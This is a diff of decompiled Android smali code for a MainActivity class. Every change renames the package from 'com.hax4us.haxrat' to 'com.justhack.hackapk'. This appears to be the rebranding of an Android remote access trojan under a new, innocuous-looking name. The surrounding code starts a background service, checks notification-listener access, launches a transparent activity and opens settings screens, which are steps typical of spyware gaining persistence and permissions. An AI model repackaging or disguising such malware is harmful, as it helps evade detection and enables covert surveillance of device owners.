@@ -1,4 +1,4 @@
-.class public Lcom/hax4us/haxrat/MainActivity;
+.class public Lcom/justhack/hackapk/MainActivity;
 .super Landroid/app/Activity;
 .source "MainActivity.java"
 
@@ -27,7 +27,7 @@
 
     move-object v6, v0
 
-    invoke-virtual {v6}, Lcom/hax4us/haxrat/MainActivity;->getContentResolver()Landroid/content/ContentResolver;
+    invoke-virtual {v6}, Lcom/justhack/hackapk/MainActivity;->getContentResolver()Landroid/content/ContentResolver;
 
     move-result-object v6
 
@@ -47,7 +47,7 @@
     .line 72
     move-object v6, v0
 
-    invoke-virtual {v6}, Lcom/hax4us/haxrat/MainActivity;->getPackageName()Ljava/lang/String;
+    invoke-virtual {v6}, Lcom/justhack/hackapk/MainActivity;->getPackageName()Ljava/lang/String;
 
     move-result-object v6
 
@@ -120,12 +120,12 @@
 
     const/high16 v14, 0x7f030000
 
-    invoke-virtual {v13, v14}, Lcom/hax4us/haxrat/MainActivity;->setContentView(I)V
+    invoke-virtual {v13, v14}, Lcom/justhack/hackapk/MainActivity;->setContentView(I)V
 
     .line 26
     move-object v13, v0
 
-    invoke-static {v13}, Lcom/hax4us/haxrat/MainService;->startService(Landroid/content/Context;)V
+    invoke-static {v13}, Lcom/justhack/hackapk/MainService;->startService(Landroid/content/Context;)V
 
     .line 27
     const-string v13, "TAGG"
@@ -139,7 +139,7 @@
     .line 28
     move-object v13, v0
 
-    invoke-direct {v13}, Lcom/hax4us/haxrat/MainActivity;->isNotificationServiceRunning()Z
+    invoke-direct {v13}, Lcom/justhack/hackapk/MainActivity;->isNotificationServiceRunning()Z
 
     move-result v13
 
@@ -153,7 +153,7 @@
     .line 31
     move-object v13, v0
 
-    invoke-virtual {v13}, Lcom/hax4us/haxrat/MainActivity;->getApplicationContext()Landroid/content/Context;
+    invoke-virtual {v13}, Lcom/justhack/hackapk/MainActivity;->getApplicationContext()Landroid/content/Context;
 
     move-result-object v13
 
@@ -240,7 +240,7 @@
 
     invoke-direct/range {v15 .. v16}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
 
-    invoke-virtual {v13, v14}, Lcom/hax4us/haxrat/MainActivity;->startActivity(Landroid/content/Intent;)V
+    invoke-virtual {v13, v14}, Lcom/justhack/hackapk/MainActivity;->startActivity(Landroid/content/Intent;)V
 
     .line 45
     new-instance v13, Landroid/content/Intent;
@@ -254,7 +254,7 @@
     move-object v15, v0
 
     :try_start_0
-    const-string v16, "com.hax4us.haxrat.TransparentActivity"
+    const-string v16, "com.justhack.hackapk.TransparentActivity"
 
     invoke-static/range {v16 .. v16}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
     :try_end_0
@@ -282,7 +282,7 @@
 
     move-object v14, v9
 
-    invoke-virtual {v13, v14}, Lcom/hax4us/haxrat/MainActivity;->startActivity(Landroid/content/Intent;)V
+    invoke-virtual {v13, v14}, Lcom/justhack/hackapk/MainActivity;->startActivity(Landroid/content/Intent;)V
 
     .line 59
     new-instance v13, Landroid/content/Intent;
@@ -338,13 +338,13 @@
 
     move-object v14, v11
 
-    invoke-virtual {v13, v14}, Lcom/hax4us/haxrat/MainActivity;->startActivity(Landroid/content/Intent;)V
+    invoke-virtual {v13, v14}, Lcom/justhack/hackapk/MainActivity;->startActivity(Landroid/content/Intent;)V
 
     .line 63
     :cond_0
     move-object v13, v0
 
-    invoke-virtual {v13}, Lcom/hax4us/haxrat/MainActivity;->finish()V
+    invoke-virtual {v13}, Lcom/justhack/hackapk/MainActivity;->finish()V
 
     return-void
 
